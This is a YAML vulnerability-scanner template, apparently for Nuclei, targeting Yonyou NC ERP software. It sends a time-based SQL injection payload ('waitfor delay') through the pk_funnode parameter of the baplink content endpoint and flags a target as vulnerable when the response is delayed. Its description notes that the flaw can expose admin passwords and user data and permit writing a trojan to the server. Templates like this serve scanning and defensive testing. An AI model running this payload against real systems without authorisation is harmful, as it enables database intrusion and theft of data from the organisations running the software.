id: yonyou-nc-baplink-sqli
info:
  name: 用友NC baplink SQL注入漏洞
  author: leadlife
  severity: high
  description: 用友NC是“企业资源规划（Enterprise Resource Planning）”的缩写，是指用友软件股份有限公司开发的一套企业管理软。用友NC系统是一种集成管理企业各项业务流程的信息化解决方案。该系统涵盖了财务、人力资源、供应链管理等多个方面，旨在帮助企业提高运营效率、优化资源利用、提升管理水平攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进⼀步获取服务器系统权限。
  reference: 
    - https://mp.weixin.qq.com/s/wnObrgE0AaIfo4digJhZhA
  classification:
    cve-id: 
  metadata:
    verified: false
    fofa-query: demo
    tips:
    repair:
    version:
  tags: yonyou,oa,nc,sqli

http:
  - raw:
      - |
        @timeout: 15s
        GET /portal/pt/baplink/content?pageId=login&pk_funnode=-1';waitfor%20delay%20'0:0:6'-- HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: identity
        User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
        Accept: text/html, image/gif, image/jpeg, ; q=.2, /; q=.2
        
    matchers:
      - type: dsl
        dsl:
          # - contains_all(body,'')
          # - status_code == 200
          - duration >= 5 && duration < 9
        condition: and